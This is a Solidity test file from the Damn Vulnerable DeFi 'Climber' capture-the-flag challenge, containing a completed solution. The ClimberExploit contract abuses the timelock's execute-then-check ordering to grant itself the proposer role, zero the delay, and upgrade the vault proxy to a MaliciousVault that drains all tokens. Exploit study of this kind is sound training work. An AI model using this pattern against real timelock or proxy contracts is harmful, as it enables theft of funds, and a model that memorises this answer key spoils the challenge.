// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {
    ClimberTimelock,
    CallerNotTimelock,
    PROPOSER_ROLE,
    ADMIN_ROLE
} from "../../src/climber/ClimberTimelock.sol";
import {
    ERC1967Proxy
} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract MaliciousVault is ClimberVault {
    function drain(address token, address recovery) external {
        // Transfer all DVT from the upgraded vault to recovery.
        SafeTransferLib.safeTransfer(
            token,
            recovery,
            IERC20(token).balanceOf(address(this))
        );
    }
}

contract ClimberExploit {
    ClimberTimelock timelock;
    ClimberVault vault;
    DamnValuableToken token;
    address recovery;

    MaliciousVault maliciousVault;
    bytes32 constant SALT = bytes32(0);

    constructor(address _timelock, address _vault, address _token, address _recovery) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(_vault);
        token = DamnValuableToken(_token);
        recovery = _recovery;
        maliciousVault = new MaliciousVault();
    }

    function attack() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = _buildOperation();

        timelock.execute(targets, values, dataElements, SALT);

        // The proxy now runs MaliciousVault logic, so drain it.
        MaliciousVault(address(vault)).drain(address(token), recovery);
    }

    // Callback called by the timelock during execute().
    function schedule() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = _buildOperation();

        timelock.schedule(targets, values, dataElements, SALT);
    }

    function _buildOperation()
        private
        view
        returns (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        )
    {
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        (
            targets[0],
            targets[1],
            targets[2],
            targets[3]
        ) = (
            address(timelock),
            address(timelock),
            address(this),
            address(vault)
        );

        (
            dataElements[0],
            dataElements[1],
            dataElements[2],
            dataElements[3]
        ) = (
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            ),
            abi.encodeWithSignature("updateDelay(uint64)", 0),
            abi.encodeWithSignature("schedule()"),
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(maliciousVault),
                ""
            )
        );
    }
}

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        vm.label(address(deployer), "deployer");
        vm.label(address(player), "player");
        vm.label(address(proposer), "proposer");
        vm.label(address(sweeper), "sweeper");
        vm.label(address(recovery), "recovery");

        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(
                        ClimberVault.initialize,
                        (deployer, proposer, sweeper)
                    ) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        ClimberExploit exploit = new ClimberExploit(
            address(timelock),
            address(vault),
            address(token),
            recovery
        );

        exploit.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(
            token.balanceOf(recovery),
            VAULT_TOKEN_BALANCE,
            "Not enough tokens in recovery account"
        );
    }
}
